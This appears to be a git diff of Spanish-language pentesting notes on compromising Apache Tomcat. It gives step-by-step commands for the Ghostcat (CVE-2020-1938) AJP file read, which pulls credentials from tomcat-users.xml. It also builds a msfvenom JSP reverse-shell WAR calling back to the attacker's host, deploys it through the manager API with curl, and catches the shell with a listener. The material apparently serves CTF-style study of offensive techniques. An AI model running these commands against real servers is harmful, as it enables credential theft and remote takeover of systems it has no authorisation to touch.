@@ -1,29 +1,21 @@
 # Tomcat 
 
-Tags: #Tomcat #Windows
+Tags: #Tomcat #Linux 
 
 ## Ruta en la web
 
 ```bash 
-/manager/html                # Ruta tipica que contiene un panel de autenticacion en donde se encuentra el panel de admin en Tomcat 
-/host-manager/html           # Ruta alternativa 
+/manager/html            # Ruta típica que contiene un panel de autenticación en donde se encuentra el panel de admin en Tomcat 
+/host-manager/html       # Ruta alternativa 
 
-/manager/status/             # Muestra la version de Tomcat         
+/manager/status/         # Muestra la versión de Tomcat         
 ```
-
-## Ruta en consola
-
-```bash 
-/etc/tomcat9/tomcat-users.xml              # Archivo que contiene usuarios y sus passwd
-/usr/share/tomcat9/etc/tomcat-users.xml    # Ruta alternativa
-```
-
 ## Crear una aplicación para subirla desde el panel Tomcat  
 
 ```bash 
 # En el panel de manager, encontramos una opción en donde podemos subir un archivo .war, por lo que hacemos lo siguiente:
 
-❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f war -o shell.war # Creamos nuestro archivo malicioso .war 
+❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP_Kali LPORT=443 -f war -o shell.war # Creamos nuestro archivo malicioso .war 
 
 	# p = Payload
 	# LHOST = Local Host (IP Atacante)
@@ -32,12 +24,54 @@ Tags: #Tomcat #Windows
 	# o = Exportar como 'shell.war'
 ```
 
-## Subir una aplicación desde la consola con credenciales validas de 'admin'
+## CVE-2020-1938 - "Ghoscat"
+* [Apache Tomcat - AJP (Ghostcat File Read/Inclusion)](https://www.exploit-db.com/exploits/48143)
+```bash 
+# condiciones 
+	- Apache Tomcat versión 9.0.30
+	- Puerto 8009 expuesto y accesible (Apache Jserv (Protocol v1.3))
+
+Paso 1: 
+❯ git clone https://github.com/00theway/Ghostcat-CNVD-2020-10487 && cd Ghostcat-CNVD-2020-10487
+
+Paso 2: Extraer credenciales 
+❯ python3 ajpShooter.py http://IP 8009 /WEB-INF/web.xml read
+
+# Credenciales de Tomcat
+❯ python3 ajpShooter.py http://IP 8009 /WEB-INF/tomcat-users.xml read
+
+# Configuración general
+❯ python3 ajpShooter.py http://IP 8009 /META-INF/context.xml read
+```
 
 ```bash 
-❯ curl -s -u 'username:passwd' -X GET "http://IP/manager/text/list"    # Listar aplicaciones existentes en Tomcat si tenemos credenciales validas 
+Paso 3: Subir un archivo malicioso para obtener una revershell o si esta expuesto el SSH ingresar al server 
+❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP_Kali LPORT=4444 -f war -o shell.war
 
-- [ ] ❯ curl -s -u 'username:passwd' "http://IP/manager/text/deploy?path=/shell" --upload-file shell.war  # Desplegar la aplicacion creada anteriormente 
+❯ curl -u 'usuario:password' -T shell.war http://IP:8080/manager/text/deploy?path=/shell
+
+Paso 4:
+❯ penelope -p 4444  # En escucha para recibir la revershell
+
+Paso 5: 
+❯ curl http://IP:8080/shell/
+```
+
+### Subir una aplicación desde la consola con credenciales válidas de 'admin'
+
+```bash 
+Paso 1: Crear la aplicación von revershell 
+❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP_Kali LPORT=4444 -f war -o shell.war
+
+Paso 2: 
+❯ curl -s -u 'username:passwd' -X GET "http://IP:8080/manager/text/list"    
+# Listar aplicaciones existentes en Tomcat 
+
+❯ curl -s -u 'username:passwd' "http://IP:8080/manager/text/deploy?path=/shell" --upload-file shell.war  
+# Desplegar la aplicacion creada anteriormente 
+
+❯ curl http://IP:8080/shell/   
+# Ejecutar la aplicación 
 ```
 
 ## Subir una aplicación sin credenciales CVE-2017-12615
